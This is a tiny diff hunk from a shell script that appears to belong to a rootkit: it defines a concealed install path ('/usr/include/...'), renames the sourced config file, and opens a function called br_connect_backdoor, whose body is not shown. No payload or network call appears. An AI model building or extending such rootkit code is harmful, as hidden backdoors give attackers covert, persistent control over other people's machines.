@@ -2,7 +2,7 @@
 
 BR_ROOTKIT_PATH="/usr/include/..."
 
-. $BR_ROOTKIT_PATH/br_config.sh
+. $BR_ROOTKIT_PATH/brconfig.sh
 
 function br_connect_backdoor()
 {
